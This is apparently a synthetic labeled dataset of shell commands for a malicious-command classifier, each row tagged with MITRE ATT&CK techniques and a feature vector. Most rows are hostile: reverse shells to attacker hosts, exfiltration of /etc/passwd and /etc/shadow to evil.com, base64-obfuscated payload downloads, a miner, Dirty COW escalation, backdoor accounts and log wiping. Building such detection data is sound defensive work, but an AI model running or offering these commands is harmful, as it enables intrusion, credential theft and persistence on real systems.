time echo 'bmNyYWNrIC1wIDIyIC0tdXNlciByb290IC1QIHBhc3MubHN0IDEwLjAuMC4x' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
df -h,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
nohup reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe ; chmod +x /tmp/payload &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
cat /etc/network/interfaces && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3  -c  ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""  ;  history  -c","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1 ; echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""wmic useraccount list && sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo ./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' | chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
"bash -c ""php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
sudo net localgroup administrators,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo  'bHMgLWxhIC9yb290IC9ldGMgL3Zhci93d3c='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
ps aux | grep nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
time echo 'Y3VybCAtWCBQT1NUIGh0dHA6Ly9ldmlsLmNvbS9jb2xsZWN0IC1kIEAvZXRjL3NoYWRvdw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1098_Account_Manipulation'],synthetic
nohup find / -writable -type d 2>/dev/null ; history -c &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo nmap --script=vuln 10.0.0.1 ; sleep 1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ls -la /root /etc /var/www && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""nmap -sV -p 22,80,443 10.0.0.0/24""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
echo 'c3NoIGFkbWluQGxvY2FsaG9zdCA7IGhpc3RvcnkgLWM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'dw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.72, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
time sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup cat /etc/hostname &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'dW5zaGFkb3cgL2V0Yy9wYXNzd2QgL2V0Yy9zaGFkb3cgPiBjcmFja21l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'cGFzc3dkIC1kIHJvb3Q=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo ls -la /root /etc /var/www ; history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup find / -name '*.conf' -readable 2>/dev/null | head -20 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
cat  /etc/passwd  |  awk  -F:  '$3  >=  1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
echo 'c3UgLSBhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd21pZXhlYy5weSBkb21haW4vYWRtaW46cGFzc0AxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo net localgroup administrators,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo w,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.32, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 | sleep 1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'd2hv' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
uname -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
find / -name 'id_rsa' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup useradd -m -s /bin/bash -G sudo newadmin && sleep 1 &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time smbclient //10.0.0.5/C$ -U Administrator | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd  -o  -u  0  -g  0  -M  -d  /root  -s  /bin/bash  ghost  |  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.64, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSgnaHR0cDovL2V2aWwuY29tL3BheWxvYWQnLCAnL3RtcC9wYXlsb2FkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmic useraccount list && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
shred -u /var/log/auth.log | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup cat /tmp/encoded | xxd -r -p | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time echo 'aWQgLUdu' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"sudo perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
scp file.txt user@host:/tmp/,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo  'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwOi8vZXZpbC5jb20vPycgKyBvcGVuKCcvZXRjL3NoYWRvdycpLnJlYWQoKSki'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
time medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh ; > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.56, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
getent  passwd  |  awk  -F:  '$3  >=  1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
"bash -c ""nc -e /bin/bash attacker.com 80""","[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'c3NoIC1pIH4vLnNzaC9zdG9sZW5fa2V5IHJvb3RAMTAuMC4wLjU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""sed -i 's/old/new/g' config.cfg""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['BENIGN'],synthetic
whoami /all && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""smbclient //10.0.0.5/C$ -U Administrator ; history -c""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cGFzc3dkIC1kIHJvb3QgOyBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
whoami /all,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
curl -s https://api.github.com/repos/user/repo,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
nohup net localgroup administrators &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time net user /domain,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1087_Account_Discovery'],synthetic
nohup cat /etc/passwd | grep -v nologin | grep -v false &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.48, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo  'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSgnaHR0cDovL2V2aWwuY29tL3BheWxvYWQnLCAnL3RtcC9wYXlsb2FkJyki'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
crontab -l,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
who,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'Li9DVkUtMjAyMS00MDM0IDsgZWNobyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
pip install requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
find  /  -name  'id_rsa'  2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
psexec.py  Administrator:password@10.0.0.5  cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
id,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5 | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net  user  /domain,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
> ~/.bash_history && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
"bash -c ""cat /tmp/encoded | xxd -r -p | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
tar -czf backup.tar.gz /home/user,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo  'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""who""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
nohup wget -q -O- --header='X-Auth: token123' http://evil.com/cmd &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo  'cGFzc3dkIC1kIHJvb3Q='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
cat  /etc/resolv.conf  &&  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo nc -e /bin/bash attacker.com 80 && sleep 1,"[0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bm1hcCAtQSAtVDQgMTkyLjE2OC4xLjAvMjQgfCBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Z3JvdXBz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
